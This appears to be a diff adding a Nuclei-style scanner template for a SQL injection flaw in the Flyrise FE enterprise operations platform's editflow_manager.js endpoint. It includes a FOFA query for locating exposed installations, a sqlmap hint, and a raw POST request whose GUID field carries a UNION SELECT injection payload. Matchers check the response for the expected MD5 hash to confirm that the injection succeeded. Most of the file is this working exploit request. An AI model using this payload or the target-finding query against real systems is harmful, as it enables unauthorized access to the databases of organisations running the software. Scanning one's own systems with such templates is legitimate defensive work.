@@ -1,0 +1,33 @@
+id: flyrise-editflow_manager-sqli
+info:
+  name: 飞企互联 FE 企业运营管理平台 editflow_manager.js - sqli
+  author: leadlife
+  severity: high
+  description:
+  metadata:
+    verified: true
+    fofa-qeury: app="飞企互联-FE企业运营管理平台"
+    sqlmap: sqlmap -r sql.txt
+    tips: GUID is injection
+  tags: flyrise,sqli
+http:
+  - raw:
+      - |-
+        POST /sysform/003/editflow_manager.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 85
+
+        option=2&GUID=-1%27+union+select+sys.fn_sqlvarbasetostr(HashBytes('MD5','106223'))--+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+          
+      - type: word
+        part: body
+        words:
+          - '0x11a52a45fff8cf2f58a66ee435a18d14'
